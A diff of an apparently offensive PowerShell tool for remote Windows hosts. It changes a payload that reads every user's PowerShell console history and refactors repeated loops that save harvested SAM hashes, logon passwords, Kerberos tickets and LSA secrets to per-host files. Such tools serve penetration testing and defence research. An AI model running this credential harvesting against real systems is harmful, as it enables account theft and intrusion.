@@ -847,10 +847,14 @@ $ConsoleHostHistory = @'
 $usersFolderPath = "C:\Users"
 $users = Get-ChildItem -Path $usersFolderPath -Directory
 
+$foundHistoryFile = $false
+
 foreach ($User in $Users) {
     $historyFilePath = Join-Path -Path $User.FullName -ChildPath "AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 
     if (Test-Path -Path $historyFilePath -ErrorAction "SilentlyContinue") {
+        $foundHistoryFile = $true
+
         $historyContent = Get-Content -Path $historyFilePath -Raw
         $historyLines = $historyContent -split "`n"
         Write-output ""
@@ -858,6 +862,11 @@ foreach ($User in $Users) {
         $historyLines | Where-Object { $_ -match '\S' } | ForEach-Object { Write-output $_.Trim() }
     }
 }
+
+if (-not $foundHistoryFile) {
+    Write-Output "No Results"
+}
+
 '@
 
 
@@ -1402,90 +1411,84 @@ foreach ($computer in $computers) {
 
 # Poll the runspaces and display results as they complete
 do {
-    foreach ($runspace in $runspaces | Where-Object {-not $_.Completed}) {
+    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
+        
         if ($runspace.Handle.IsCompleted) {
             $runspace.Completed = $true
             $result = $runspace.Runspace.EndInvoke($runspace.Handle)
-            
             $hasDisplayedResult = $false
 
-            if ($result -eq "Access Denied"){
-                if ($successOnly){continue}
+            # [other conditions for $result]
+            if ($result -eq "Access Denied") {
+                if ($successOnly) { continue }
                 Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                 continue
-            }
-
-            elseif ($result -eq "Unspecified Error"){
-                if ($successOnly){continue}
+            } 
+            elseif ($result -eq "Unspecified Error") {
+                if ($successOnly) { continue }
                 Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                 continue
-            }
-
-            elseif ($result -eq "Timed Out"){
-            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
-            }
-
+            } 
+            elseif ($result -eq "Timed Out") {
+                if ($successOnly) { continue }
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
+                continue
+            } 
             elseif ($result -eq "Successful Connection PME") {
                 Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
-            }
+            } 
+            elseif ($result -eq "Unable to connect") {
+                if ($successOnly) { continue }
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
+            } 
+            elseif ($result -match "[a-zA-Z0-9]") {
+                
+                if ($result -eq "No Results") {
+                    if ($successOnly) { continue }
+                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
+                } 
+                else {
+                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
 
-            elseif ($result -eq "Unable to connect"){}
-            
-            elseif ($result  -match "[a-zA-Z0-9]") {
-                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+                    $filePath = switch ($Module) {
+                        "SAM"            { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
+                        "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-RAW.txt" }
+                        "Tickets"        { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
+                        "eKeys"          { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
+                        "KerbDump"       { "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
+                        "LSA"            { "$LSA\$($runspace.ComputerName)-LSA.txt" }
+                        "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
+                        "Files"          { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
+                        default          { $null }
+                    }
 
-                switch ($Module) {
-                    "SAM" {
-                        $result | Out-File -FilePath "$SAM\$($runspace.ComputerName)-SAMHashes.txt" -Encoding "ASCII"
-                        if ($ShowOutput) { $result | Write-Host ; Write-Host ;  $hasDisplayedResult = $true }
-                    }
-                    "LogonPasswords" {
-                        $result | Out-File -FilePath "$LogonPasswords\$($runspace.ComputerName)-RAW.txt" -Encoding "ASCII"
-                        if ($ShowOutput) { $result | Write-Host ; Write-Host ;  $hasDisplayedResult = $true }
-                    }
-                    "Tickets" {
-                        $result | Out-File -FilePath "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" -Encoding "ASCII"
-                        if ($ShowOutput) { $result | Write-Host ; Write-Host ;  $hasDisplayedResult = $true }
-                    }
-                    "eKeys" {
-                        $result | Out-File -FilePath "$eKeys\$($runspace.ComputerName)-eKeys.txt" -Encoding "ASCII"
-                        if ($ShowOutput) { $result | Write-Host ; Write-Host ;  $hasDisplayedResult = $true }
-                    }
-                    "KerbDump" {
-                        $result | Out-File -FilePath "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" -Encoding "ASCII"
-                        if ($ShowOutput) { $result | Write-Host ; Write-Host ;  $hasDisplayedResult = $true }
-                    }
-                    "LSA" {
-                        $result | Out-File -FilePath "$LSA\$($runspace.ComputerName)-LSA.txt" -Encoding "ASCII"
-                        if ($ShowOutput) { $result | Write-Host ; Write-Host ;  $hasDisplayedResult = $true }
-                    }
-                    "ConsoleHistory" {
-                        $result | Out-File -FilePath "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" -Encoding "ASCII"
-                        if ($ShowOutput) { $result | Write-Host ; Write-Host ;  $hasDisplayedResult = $true }
-                    }
-                    "Files" {
-                        $result | Out-File -FilePath "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" -Encoding "ASCII"
-                        if ($ShowOutput) { $result | Write-Host ; Write-Host ;  $hasDisplayedResult = $true }
-                    }
-                    default {
-                        if (-not $Module -and -not $hasDisplayedResult) {
+                    if ($filePath) {
+                        $result | Out-File -FilePath $filePath -Encoding "ASCII"
+                        
+                        if ($ShowOutput) {
                             $result | Write-Host
                             Write-Host
                             $hasDisplayedResult = $true
                         }
                     }
+
+                    # Handle the default case.
+                    if (-not $Module -and -not $hasDisplayedResult) {
+                        $result | Write-Host
+                        Write-Host
+                        $hasDisplayedResult = $true
+                    }
                 }
-            }
-            
-            elseif ($result -notmatch "[a-zA-Z0-9]"){
+            } 
+            elseif ($result -notmatch "[a-zA-Z0-9]") {
                 Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
             }
-
         }
-        
     }
+
     Start-Sleep -Milliseconds 100
-} while ($runspaces | Where-Object {-not $_.Completed})
+} 
+while ($runspaces | Where-Object { -not $_.Completed })
 
 # Clean up
 $runspacePool.Close()
@@ -1768,90 +1771,86 @@ foreach ($computer in $computers) {
 
 # Poll the runspaces and display results as they complete
 do {
-    foreach ($runspace in $runspaces | Where-Object {-not $_.Completed}) {
+    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
+        
         if ($runspace.Handle.IsCompleted) {
             $runspace.Completed = $true
             $result = $runspace.Runspace.EndInvoke($runspace.Handle)
-            
             $hasDisplayedResult = $false
 
-            if ($result -eq "Access Denied"){
-                if ($successOnly){continue}
+            # [other conditions for $result]
+            if ($result -eq "Access Denied") {
+                if ($successOnly) { continue }
                 Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                 continue
-            }
-
-            elseif ($result -eq "Unspecified Error"){
-                if ($successOnly){continue}
+            } 
+            elseif ($result -eq "Unspecified Error") {
+                if ($successOnly) { continue }
                 Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                 continue
-            }
-
-            elseif ($result -eq "Timed Out"){
-            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
-            }
-
+            } 
+            elseif ($result -eq "Timed Out") {
+                if ($successOnly) { continue }
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
+                continue
+            } 
             elseif ($result -eq "Successful Connection PME") {
                 Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
-            }
+            } 
+            elseif ($result -eq "Unable to connect") {
+                if ($successOnly) { continue }
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
+            } 
+            elseif ($result -match "[a-zA-Z0-9]") {
+                
+                if ($result -eq "No Results") {
+                    if ($successOnly) { continue }
+                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
+                } 
+                else {
+                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
 
-            elseif ($result -eq "Unable to connect"){}
-            
-            elseif ($result  -match "[a-zA-Z0-9]") {
-                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+                    $filePath = switch ($Module) {
+                        "SAM"            { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
+                        "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-RAW.txt" }
+                        "Tickets"        { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
+                        "eKeys"          { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
+                        "KerbDump"       { "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
+                        "LSA"            { "$LSA\$($runspace.ComputerName)-LSA.txt" }
+                        "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
+                        "Files"          { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
+                        default          { $null }
+                    }
 
-                switch ($Module) {
-                    "SAM" {
-                        $result | Out-File -FilePath "$SAM\$($runspace.ComputerName)-SAMHashes.txt" -Encoding "ASCII"
-                        if ($ShowOutput) { $result | Write-Host ; Write-Host ;  $hasDisplayedResult = $true }
-                    }
-                    "LogonPasswords" {
-                        $result | Out-File -FilePath "$LogonPasswords\$($runspace.ComputerName)-RAW.txt" -Encoding "ASCII"
-                        if ($ShowOutput) { $result | Write-Host ; Write-Host ;  $hasDisplayedResult = $true }
-                    }
-                    "Tickets" {
-                        $result | Out-File -FilePath "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" -Encoding "ASCII"
-                        if ($ShowOutput) { $result | Write-Host ; Write-Host ;  $hasDisplayedResult = $true }
-                    }
-                    "eKeys" {
-                        $result | Out-File -FilePath "$eKeys\$($runspace.ComputerName)-eKeys.txt" -Encoding "ASCII"
-                        if ($ShowOutput) { $result | Write-Host ; Write-Host ;  $hasDisplayedResult = $true }
-                    }
-                    "KerbDump" {
-                        $result | Out-File -FilePath "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" -Encoding "ASCII"
-                        if ($ShowOutput) { $result | Write-Host ; Write-Host ;  $hasDisplayedResult = $true }
-                    }
-                    "LSA" {
-                        $result | Out-File -FilePath "$LSA\$($runspace.ComputerName)-LSA.txt" -Encoding "ASCII"
-                        if ($ShowOutput) { $result | Write-Host ; Write-Host ;  $hasDisplayedResult = $true }
-                    }
-                    "ConsoleHistory" {
-                        $result | Out-File -FilePath "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" -Encoding "ASCII"
-                        if ($ShowOutput) { $result | Write-Host ; Write-Host ;  $hasDisplayedResult = $true }
-                    }
-                    "Files" {
-                        $result | Out-File -FilePath "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" -Encoding "ASCII"
-                        if ($ShowOutput) { $result | Write-Host ; Write-Host ;  $hasDisplayedResult = $true }
-                    }
-                    default {
-                        if (-not $Module -and -not $hasDisplayedResult) {
+                    if ($filePath) {
+                        $result | Out-File -FilePath $filePath -Encoding "ASCII"
+                        
+                        if ($ShowOutput) {
                             $result | Write-Host
                             Write-Host
                             $hasDisplayedResult = $true
                         }
                     }
+
+                    # Handle the default case.
+                    if (-not $Module -and -not $hasDisplayedResult) {
+                        $result | Write-Host
+                        Write-Host
+                        $hasDisplayedResult = $true
+                    }
                 }
-            }
-            
-            elseif ($result -notmatch "[a-zA-Z0-9]"){
+            } 
+            elseif ($result -notmatch "[a-zA-Z0-9]") {
                 Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
             }
-
         }
-        
     }
+
     Start-Sleep -Milliseconds 100
-} while ($runspaces | Where-Object {-not $_.Completed})
+} 
+while ($runspaces | Where-Object { -not $_.Completed })
+
+
 # Clean up
 $runspacePool.Close()
 $runspacePool.Dispose()
@@ -1967,91 +1966,90 @@ foreach ($computer in $computers) {
 }
 
 # Poll the runspaces and display results as they complete
+
+
 do {
-    foreach ($runspace in $runspaces | Where-Object {-not $_.Completed}) {
+    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
+        
         if ($runspace.Handle.IsCompleted) {
             $runspace.Completed = $true
             $result = $runspace.Runspace.EndInvoke($runspace.Handle)
-            
             $hasDisplayedResult = $false
 
-            if ($result -eq "Access Denied"){
-                if ($successOnly){continue}
+            # [other conditions for $result]
+            if ($result -eq "Access Denied") {
+                if ($successOnly) { continue }
                 Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                 continue
-            }
-
-            elseif ($result -eq "Unspecified Error"){
-                if ($successOnly){continue}
+            } 
+            elseif ($result -eq "Unspecified Error") {
+                if ($successOnly) { continue }
                 Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                 continue
-            }
-
-            elseif ($result -eq "Timed Out"){
-            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
-            }
-
+            } 
+            elseif ($result -eq "Timed Out") {
+                if ($successOnly) { continue }
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
+                continue
+            } 
             elseif ($result -eq "Successful Connection PME") {
                 Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
-            }
+            } 
+            elseif ($result -eq "Unable to connect") {
+                if ($successOnly) { continue }
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
+            } 
+            elseif ($result -match "[a-zA-Z0-9]") {
+                
+                if ($result -eq "No Results") {
+                    if ($successOnly) { continue }
+                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
+                } 
+                else {
+                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
 
-            elseif ($result -eq "Unable to connect"){}
-            
-            elseif ($result  -match "[a-zA-Z0-9]") {
-                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+                    $filePath = switch ($Module) {
+                        "SAM"            { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
+                        "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-RAW.txt" }
+                        "Tickets"        { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
+                        "eKeys"          { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
+                        "KerbDump"       { "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
+                        "LSA"            { "$LSA\$($runspace.ComputerName)-LSA.txt" }
+                        "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
+                        "Files"          { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
+                        default          { $null }
+                    }
 
-                switch ($Module) {
-                    "SAM" {
-                        $result | Out-File -FilePath "$SAM\$($runspace.ComputerName)-SAMHashes.txt" -Encoding "ASCII"
-                        if ($ShowOutput) { $result | Write-Host ; Write-Host ;  $hasDisplayedResult = $true }
-                    }
-                    "LogonPasswords" {
-                        $result | Out-File -FilePath "$LogonPasswords\$($runspace.ComputerName)-RAW.txt" -Encoding "ASCII"
-                        if ($ShowOutput) { $result | Write-Host ; Write-Host ;  $hasDisplayedResult = $true }
-                    }
-                    "Tickets" {
-                        $result | Out-File -FilePath "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" -Encoding "ASCII"
-                        if ($ShowOutput) { $result | Write-Host ; Write-Host ;  $hasDisplayedResult = $true }
-                    }
-                    "eKeys" {
-                        $result | Out-File -FilePath "$eKeys\$($runspace.ComputerName)-eKeys.txt" -Encoding "ASCII"
-                        if ($ShowOutput) { $result | Write-Host ; Write-Host ;  $hasDisplayedResult = $true }
-                    }
-                    "KerbDump" {
-                        $result | Out-File -FilePath "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" -Encoding "ASCII"
-                        if ($ShowOutput) { $result | Write-Host ; Write-Host ;  $hasDisplayedResult = $true }
-                    }
-                    "LSA" {
-                        $result | Out-File -FilePath "$LSA\$($runspace.ComputerName)-LSA.txt" -Encoding "ASCII"
-                        if ($ShowOutput) { $result | Write-Host ; Write-Host ;  $hasDisplayedResult = $true }
-                    }
-                    "ConsoleHistory" {
-                        $result | Out-File -FilePath "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" -Encoding "ASCII"
-                        if ($ShowOutput) { $result | Write-Host ; Write-Host ;  $hasDisplayedResult = $true }
-                    }
-                    "Files" {
-                        $result | Out-File -FilePath "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" -Encoding "ASCII"
-                        if ($ShowOutput) { $result | Write-Host ; Write-Host ;  $hasDisplayedResult = $true }
-                    }
-                    default {
-                        if (-not $Module -and -not $hasDisplayedResult) {
+                    if ($filePath) {
+                        $result | Out-File -FilePath $filePath -Encoding "ASCII"
+                        
+                        if ($ShowOutput) {
                             $result | Write-Host
                             Write-Host
                             $hasDisplayedResult = $true
                         }
                     }
+
+                    # Handle the default case.
+                    if (-not $Module -and -not $hasDisplayedResult) {
+                        $result | Write-Host
+                        Write-Host
+                        $hasDisplayedResult = $true
+                    }
                 }
-            }
-            
-            elseif ($result -notmatch "[a-zA-Z0-9]"){
+            } 
+            elseif ($result -notmatch "[a-zA-Z0-9]") {
                 Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
             }
-
         }
-        
     }
+
     Start-Sleep -Milliseconds 100
-} while ($runspaces | Where-Object {-not $_.Completed})
+} 
+while ($runspaces | Where-Object { -not $_.Completed })
+
+
+
 
 
 # Clean up
@@ -3441,90 +3439,84 @@ foreach ($computer in $computers) {
 
 # Poll the runspaces and display results as they complete
 do {
-    foreach ($runspace in $runspaces | Where-Object {-not $_.Completed}) {
+    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
+        
         if ($runspace.Handle.IsCompleted) {
             $runspace.Completed = $true
             $result = $runspace.Runspace.EndInvoke($runspace.Handle)
-            
             $hasDisplayedResult = $false
 
-            if ($result -eq "Access Denied"){
-                if ($successOnly){continue}
+            # [other conditions for $result]
+            if ($result -eq "Access Denied") {
+                if ($successOnly) { continue }
                 Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                 continue
-            }
-
-            elseif ($result -eq "Unspecified Error"){
-                if ($successOnly){continue}
+            } 
+            elseif ($result -eq "Unspecified Error") {
+                if ($successOnly) { continue }
                 Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                 continue
-            }
-
-            elseif ($result -eq "Timed Out"){
-            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
-            }
-
+            } 
+            elseif ($result -eq "Timed Out") {
+                if ($successOnly) { continue }
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
+                continue
+            } 
             elseif ($result -eq "Successful Connection PME") {
                 Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
-            }
+            } 
+            elseif ($result -eq "Unable to connect") {
+                if ($successOnly) { continue }
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
+            } 
+            elseif ($result -match "[a-zA-Z0-9]") {
+                
+                if ($result -eq "No Results") {
+                    if ($successOnly) { continue }
+                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
+                } 
+                else {
+                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
 
-            elseif ($result -eq "Unable to connect"){}
-            
-            elseif ($result  -match "[a-zA-Z0-9]") {
-                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+                    $filePath = switch ($Module) {
+                        "SAM"            { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
+                        "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-RAW.txt" }
+                        "Tickets"        { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
+                        "eKeys"          { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
+                        "KerbDump"       { "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
+                        "LSA"            { "$LSA\$($runspace.ComputerName)-LSA.txt" }
+                        "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
+                        "Files"          { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
+                        default          { $null }
+                    }
 
-                switch ($Module) {
-                    "SAM" {
-                        $result | Out-File -FilePath "$SAM\$($runspace.ComputerName)-SAMHashes.txt" -Encoding "ASCII"
-                        if ($ShowOutput) { $result | Write-Host ; Write-Host ;  $hasDisplayedResult = $true }
-                    }
-                    "LogonPasswords" {
-                        $result | Out-File -FilePath "$LogonPasswords\$($runspace.ComputerName)-RAW.txt" -Encoding "ASCII"
-                        if ($ShowOutput) { $result | Write-Host ; Write-Host ;  $hasDisplayedResult = $true }
-                    }
-                    "Tickets" {
-                        $result | Out-File -FilePath "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" -Encoding "ASCII"
-                        if ($ShowOutput) { $result | Write-Host ; Write-Host ;  $hasDisplayedResult = $true }
-                    }
-                    "eKeys" {
-                        $result | Out-File -FilePath "$eKeys\$($runspace.ComputerName)-eKeys.txt" -Encoding "ASCII"
-                        if ($ShowOutput) { $result | Write-Host ; Write-Host ;  $hasDisplayedResult = $true }
-                    }
-                    "KerbDump" {
-                        $result | Out-File -FilePath "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" -Encoding "ASCII"
-                        if ($ShowOutput) { $result | Write-Host ; Write-Host ;  $hasDisplayedResult = $true }
-                    }
-                    "LSA" {
-                        $result | Out-File -FilePath "$LSA\$($runspace.ComputerName)-LSA.txt" -Encoding "ASCII"
-                        if ($ShowOutput) { $result | Write-Host ; Write-Host ;  $hasDisplayedResult = $true }
-                    }
-                    "ConsoleHistory" {
-                        $result | Out-File -FilePath "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" -Encoding "ASCII"
-                        if ($ShowOutput) { $result | Write-Host ; Write-Host ;  $hasDisplayedResult = $true }
-                    }
-                    "Files" {
-                        $result | Out-File -FilePath "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" -Encoding "ASCII"
-                        if ($ShowOutput) { $result | Write-Host ; Write-Host ;  $hasDisplayedResult = $true }
-                    }
-                    default {
-                        if (-not $Module -and -not $hasDisplayedResult) {
+                    if ($filePath) {
+                        $result | Out-File -FilePath $filePath -Encoding "ASCII"
+                        
+                        if ($ShowOutput) {
                             $result | Write-Host
                             Write-Host
                             $hasDisplayedResult = $true
                         }
                     }
+
+                    # Handle the default case.
+                    if (-not $Module -and -not $hasDisplayedResult) {
+                        $result | Write-Host
+                        Write-Host
+                        $hasDisplayedResult = $true
+                    }
                 }
-            }
-            
-            elseif ($result -notmatch "[a-zA-Z0-9]"){
+            } 
+            elseif ($result -notmatch "[a-zA-Z0-9]") {
                 Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
             }
-
         }
-        
     }
+
     Start-Sleep -Milliseconds 100
-} while ($runspaces | Where-Object {-not $_.Completed})
+} 
+while ($runspaces | Where-Object { -not $_.Completed })
 
 
 
